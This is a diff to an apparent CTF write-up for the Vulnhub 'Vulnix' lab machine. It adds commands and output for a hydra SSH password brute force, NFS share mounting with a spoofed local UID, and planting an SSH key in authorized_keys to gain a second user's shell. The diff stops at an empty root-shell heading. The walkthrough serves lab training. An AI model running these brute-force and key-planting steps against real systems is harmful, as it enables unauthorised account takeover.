@@ -3,7 +3,7 @@ title: Vulnhub - HackLAB Vulnix
 description: My writeup on HackLAB Vulnix box.
 categories:
  - vulnhub
-tags: vulnhub smtp metasploit smtp-user-enum hydra
+tags: vulnhub smtp metasploit smtp-user-enum hydra ssh nfs
 ---
 
 ![](https://i.imgur.com/B2q8rOI.jpg)
@@ -147,7 +147,7 @@ msf6 auxiliary(scanner/smtp/smtp_enum) > exploit
 [*] Auxiliary module execution completed
 ```
 
-smtp-user-enum (Kali has it pre-installed or you can find [here](https://github.com/pentestmonkey/smtp-user-enum){:target="_blank"}:
+smtp-user-enum (Kali has it pre-installed or you can find [here](https://github.com/pentestmonkey/smtp-user-enum){:target="_blank"}):
 
 ```
 $ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t $ip                                                                                 
@@ -183,8 +183,135 @@ $ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_
 192.168.1.21: www-data exists
 ```
 
+## Shell as user
+
 We can detect 2 "weird" usernames the `user` & `whoopsie` so we can perform a SSH brute force attack now using `hydra`. A brute force on `user` will give us access. Note: You **_MUST_** use number of connects in parallel(-t 4).
 
+```
+$ hydra -l user -P /usr/share/wordlists/rockyou.txt $ip -t 4 ssh          
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-29 14:11:32
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.1.21:22/
+[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active
+[STATUS] 32.33 tries/min, 97 tries in 00:03h, 14344302 to do in 7393:59h, 4 active
+[STATUS] 29.14 tries/min, 204 tries in 00:07h, 14344195 to do in 8203:23h, 4 active
+[STATUS] 28.33 tries/min, 425 tries in 00:15h, 14343974 to do in 8437:38h, 4 active
+[22][ssh] host: 192.168.1.21   login: user   password: letmein
+```
 
+```
+$ ssh user@$ip       
+user@192.168.1.21's password: 
 
+user@vulnix:~$ whoami;id
+user
+uid=1000(user) gid=1000(user) groups=1000(user),100(users)
+```
+
+## Shell as vulnix
+
+We can see another user exists on the system, the user `vulnix`:
+
+```
+user@vulnix:~$ cat /etc/passwd | cut -d ':' -f 1,7 | grep bash
+root:/bin/bash
+user:/bin/bash
+vulnix:/bin/bash
+```
+
+If we go back to nmap scan we can see that NFS is open.
+
+```
+2049/tcp  open  nfs_acl    2-3 (RPC #100227)
+```
+
+NFS(Network File System) allows a system to share files & directories with others in a network. Let's identify the shared directory first:
+
+```
+$ showmount -e 192.168.1.21
+Export list for 192.168.1.21:
+/home/vulnix *
+```
+
+Let's mount it:
+
+```
+$ mkdir exp
+$ mount -t nfs 192.168.1.21:/home/vulnix exp
+```
+
+But we can't access the directory:
+
+```
+$ cd exp
+cd: permission denied: exp
+```
+
+Here we'll do a little trick. We'll create a temporary user on our system with the UID of vulnix.
+
+```
+user@vulnix:~$ id vulnix
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+```
+
+```
+$ useradd vulnix
+$ usermod -u 2008 vulnix                                                                                                                                                         
+$ su - vulnix
+$ cd exp
+$ ls -la
+total 20
+drwxr-x--- 2 nobody 4294967294 4096 Sep  2  2012 .
+drwxr-xr-x 4 root   root       4096 Nov 29 14:44 ..
+-rw-r--r-- 1 nobody 4294967294  220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody 4294967294 3486 Apr  3  2012 .bashrc
+-rw-r--r-- 1 nobody 4294967294  675 Apr  3  2012 .profile
+$ 
+```
+
+Perfect, now let's setup a public key authentication.
+
+Let's generate the RSA keys first:
+
+```
+$ ssh-keygen -t rsa                                                                                                                                                             
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:I+UYBv0h1/lQGx2TJbB75/Xi7Vi6Fw5CGhewtCUoMf8 root@0xatomlab
+The key's randomart image is:
++---[RSA 3072]----+
+|    .+. .=.++o++.|
+|     o=.+ O. +oo |
+|      +=.+ o+    |
+|     . =o. o..   |
+|      o SE= . . o|
+|       . o . o +o|
+|            . + =|
+|             . B.|
+|              =+o|
++----[SHA256]-----+
+```
+
+Now let's copy the public key to authorized_keys:
+
+```
+$ mkdir .ssh
+$ cd .ssh
+$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7PjCWVlzq4mOXSnDWMtDX4OS/lsLWRgASMdqnEAeB4RWrv4ek3/HhViSDCeFwr7h8b6SyBzSMi1mMVgS+INAZY0CilZVLSax4rNlg317AYz5zBHu3AM35hf1oPf/1EssCyqjOSHK+qOe0VH4/7nltS4jfL/Wgx9WmMaNHURjeD/aPmksFqFckxmPdMdoRRaB1y1Wju6qv52zKebz0Xjo7ClL7bnpbly7ulQeL0DYJAIDEVVKKHaGF6WiGd1Vblyk96a0eULdTKfoITLAlESnveMBE6IOBl1C/G1fN6lU3R03Soo4/bu71kr+lfdjHAERPM7eq8JlfO+e4/3Szo/1EVtd1sRL8Kr58oxR8eyJVQeC7kUncbrH49A13tCNJpZHefIKyfCXyAhTR8PV1yB7xUHlA4T1njmr59MCZbSMm2czze0Zmnl3qURrHy40sb/XzyGLDXqu26oPAMJwfipfpJTY5xZMgMD2iV4SOsOJNf4lIfzPXb64eX7+HO4jW/c8= root@0xatomlab > authorized_keys
+```
+
+```
+$ ssh -i id_rsa vulnix@192.168.1.21
+
+vulnix@vulnix:~$ whoami;id
+vulnix
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+```
+
+## Shell as root
